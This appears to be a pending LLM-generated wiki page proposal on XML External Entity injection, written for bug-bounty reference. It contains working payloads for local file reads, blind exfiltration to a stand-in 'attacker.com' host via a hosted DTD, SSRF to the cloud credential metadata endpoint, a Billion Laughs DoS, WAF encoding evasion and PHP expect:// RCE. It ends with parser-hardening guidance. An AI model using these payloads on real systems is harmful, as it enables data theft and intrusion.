---
type: llm-wiki-review
status: needs-review
decision: pending
revision: 1
operation: create
target: concepts/xml-external-entity-injection.md
sources:
  - raw/articles/xxe.md
---

# Proposed Wiki change

## What will change
Compiles a dedicated concept page detailing XML External Entity (XXE) injection mechanisms, in-band vs blind OOB exfiltration, CDATA wrapping, cloud-native escalation, and parser remediation.

## Proposed content

---
title: XML External Entity (XXE) Injection & Parser Exploitation
created: 2026-09-24
updated: 2026-09-24
type: concept
tags:
  - xxe
  - ssrf
  - bug-bounty
sources:
  - unprocessed-obsidians/xxe.md
confidence: high
contested: false
contradictions: []
---

# XML External Entity (XXE) Injection & Parser Exploitation

## Overview
XML External Entity (XXE) injection occurs when an XML parser evaluates untrusted XML documents containing external entity declarations within a Document Type Definition (DTD). When default parser configurations permit external DTD processing and general/parameter entity resolution, attackers can force the parser to disclose local filesystem contents, initiate internal Server-Side Request Forgery (SSRF) requests, or induce Denial of Service.

## Core XXE Mechanisms & Primitives

### 1. Classic In-Band File Disclosure
When the application reflects parsed XML element values back in the HTTP response:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&file;</data>
</root>
```

### 2. CDATA Extraction (Multiline & Special Characters)
Extracting files containing XML delimiters (`<`, `&`, `>`) breaks standard XML parsing. CDATA wrapping resolves this via parameter entities:
```xml
<!DOCTYPE root [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/fstab">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd">
  %dtd;
]>
<root>&all;</root>
```
Attacker-hosted `combine.dtd`:
```xml
<!ENTITY all "%start;%file;%end;">
```

### 3. Blind Out-of-Band (OOB) Exfiltration
When no XML content is reflected in the HTTP response, parameter entities exfiltrate file data to an external listener:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval SYSTEM "http://attacker.com/evil.dtd">
  %eval;
  %exfil;
]>
<root><data>test</data></root>
```
Attacker-hosted `evil.dtd`:
```xml
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

## Cloud & Enterprise Escalation Paths
- **SSRF to Cloud Metadata**:
  ```xml
  <!ENTITY metadata SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ```
- **Office / Archive Documents**:
  Unpacking `.docx`, `.xlsx`, or `.svg` files, injecting entity definitions into internal XML files (e.g. `[Content_Types].xml`, `xl/workbook.xml`), and repacking the archive.
- **Denial of Service (Billion Laughs)**:
  Exponential entity expansion crashing parser memory allocations:
  ```xml
  <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    ...
  ]>
  ```

## Filter Evasion & Encoding
- **Encoding Manipulation**: Serving XML with UTF-16, IBM037, or ISO-8859-1 encodings to bypass WAF pattern matching expecting standard ASCII/UTF-8 tags:
  ```xml
  <?xml version="1.0" encoding="UTF-16"?>
  ```
- **PHP Expect Wrapper**: On misconfigured PHP environments: `SYSTEM "expect://id"` yielding immediate RCE.

## Defensive Hardening
Completely disable `DOCTYPE` declarations and external DTD resolution across all XML parsers:
- **Java (DOM/SAX/StAX)**:
  ```java
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```
- **Python (defusedxml)**: Use `defusedxml` packages instead of standard `xml.etree`.
- **PHP (libxml)**: `libxml_disable_entity_loader(true)`.

## Related Pages
- [[xxe]]
- [[server-side-request-forgery]]
- [[deserialization-attacks]]

## Evidence and uncertainty
Synthesized from `unprocessed-obsidians/xxe.md`. Covers standard DTD entity handling, blind OOB exfiltration, and parser remediation.

## Human feedback
Optionally explain or edit what should change.
